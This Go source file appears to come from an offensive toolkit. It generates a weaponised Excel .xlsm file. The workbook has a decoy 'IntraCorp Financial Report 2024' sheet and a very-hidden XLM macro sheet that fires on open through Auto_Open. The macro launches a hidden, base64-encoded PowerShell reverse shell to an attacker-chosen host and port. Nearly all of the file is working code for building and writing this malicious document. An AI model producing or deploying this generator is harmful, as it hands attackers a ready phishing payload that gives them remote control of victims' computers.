package payload

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"unicode/utf16"
)

// xlsmPsB64 encodes the PowerShell reverse-shell as UTF-16LE base64, identical
// to the Python `base64.b64encode(ps.encode('utf-16-le')).decode()` call.
func xlsmPsB64(lhost, lport string) string {
	ps := fmt.Sprintf(
		"$c=New-Object Net.Sockets.TCPClient('%s',%s);"+
			"$s=$c.GetStream();"+
			"[byte[]]$b=0..65535|%%{0};"+
			"while(($i=$s.Read($b,0,$b.Length))-ne 0){"+
			"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"+
			"$r=(iex $d 2>&1|Out-String);"+
			"$r2=$r+'PS '+(pwd).Path+'> ';"+
			"$sb=([Text.Encoding]::ASCII).GetBytes($r2);"+
			"$s.Write($sb,0,$sb.Length);$s.Flush()};"+
			"$c.Close()",
		lhost, lport,
	)
	codes := utf16.Encode([]rune(ps))
	buf := make([]byte, len(codes)*2)
	for i, v := range codes {
		buf[i*2] = byte(v)
		buf[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// GenerateXLSM builds and returns the bytes of a .xlsm file containing an
// XLM macro that runs a PowerShell reverse shell on open.
//
// Structure:
//   - Sheet1       — visible decoy financial sheet
//   - Auto_Open    — very-hidden XLM macro sheet
//   - definedName Auto_Open → Auto_Open!$A$1  (triggers on workbook open)
func GenerateXLSM(lhost, lport string) ([]byte, error) {
	b64 := xlsmPsB64(lhost, lport)
	execF := fmt.Sprintf(`=EXEC("cmd /c powershell -nop -w hidden -enc %s")`, b64)

	contentTypes := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml"
    ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/macrosheets/sheet1.xml"
    ContentType="application/vnd.ms-excel.macrosheet+xml"/>
  <Override PartName="/xl/styles.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
  <Override PartName="/xl/sharedStrings.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
</Types>`

	pkgRels := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="xl/workbook.xml"/>
</Relationships>`

	wbRels := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
    Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet"
    Target="macrosheets/sheet1.xml"/>
  <Relationship Id="rId3"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
    Target="styles.xml"/>
  <Relationship Id="rId4"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings"
    Target="sharedStrings.xml"/>
</Relationships>`

	workbook := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1"     sheetId="1" r:id="rId1"/>
    <sheet name="Auto_Open"  sheetId="2" state="veryHidden" r:id="rId2"/>
  </sheets>
  <definedNames>
    <definedName name="Auto_Open">'Auto_Open'!$A$1</definedName>
  </definedNames>
</workbook>`

	sheet1 := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="s"><v>0</v></c>
    </row>
    <row r="3">
      <c r="A3" t="s"><v>1</v></c>
      <c r="B3" t="s"><v>2</v></c>
      <c r="C3" t="s"><v>3</v></c>
      <c r="D3" t="s"><v>4</v></c>
    </row>
    <row r="4">
      <c r="A4" t="s"><v>5</v></c>
      <c r="B4"><v>120000</v></c>
      <c r="C4"><v>145000</v></c>
      <c r="D4"><v>98000</v></c>
    </row>
    <row r="5">
      <c r="A5" t="s"><v>6</v></c>
      <c r="B5"><v>45000</v></c>
      <c r="C5"><v>52000</v></c>
      <c r="D5"><v>41000</v></c>
    </row>
    <row r="6">
      <c r="A6" t="s"><v>7</v></c>
      <c r="B6"><v>230000</v></c>
      <c r="C6"><v>245000</v></c>
      <c r="D6"><v>251000</v></c>
    </row>
  </sheetData>
</worksheet>`

	macrosheet := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="str"><f>%s</f><v/></c>
    </row>
    <row r="2">
      <c r="A2" t="str"><f>=HALT()</f><v/></c>
    </row>
  </sheetData>
</worksheet>`, execF)

	styles := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <fonts count="2">
    <font><sz val="11"/><name val="Calibri"/></font>
    <font><b/><sz val="11"/><name val="Calibri"/></font>
  </fonts>
  <fills count="2">
    <fill><patternFill patternType="none"/></fill>
    <fill><patternFill patternType="gray125"/></fill>
  </fills>
  <borders count="1">
    <border><left/><right/><top/><bottom/><diagonal/></border>
  </borders>
  <cellStyleXfs count="1">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
  </cellStyleXfs>
  <cellXfs count="2">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1"/>
  </cellXfs>
</styleSheet>`

	sharedStrings := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="8" uniqueCount="8">
  <si><t>IntraCorp Financial Report 2024</t></si>
  <si><t>Department</t></si>
  <si><t>Q1</t></si>
  <si><t>Q2</t></si>
  <si><t>Q3</t></si>
  <si><t>Sales</t></si>
  <si><t>Marketing</t></si>
  <si><t>Engineering</t></si>
</sst>`

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	files := []struct{ name, body string }{
		{"[Content_Types].xml", contentTypes},
		{"_rels/.rels", pkgRels},
		{"xl/workbook.xml", workbook},
		{"xl/_rels/workbook.xml.rels", wbRels},
		{"xl/worksheets/sheet1.xml", sheet1},
		{"xl/macrosheets/sheet1.xml", macrosheet},
		{"xl/styles.xml", styles},
		{"xl/sharedStrings.xml", sharedStrings},
	}
	for _, f := range files {
		w, err := zw.Create(f.name)
		if err != nil {
			return nil, fmt.Errorf("zip create %s: %w", f.name, err)
		}
		if _, err := w.Write([]byte(f.body)); err != nil {
			return nil, fmt.Errorf("zip write %s: %w", f.name, err)
		}
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// WriteXLSM generates the weaponized .xlsm and writes it to payloadsDir/payload.xlsm.
func WriteXLSM(lhost, lport, payloadsDir string) error {
	data, err := GenerateXLSM(lhost, lport)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(payloadsDir, 0o755); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(payloadsDir, "payload.xlsm"), data, 0o644)
}
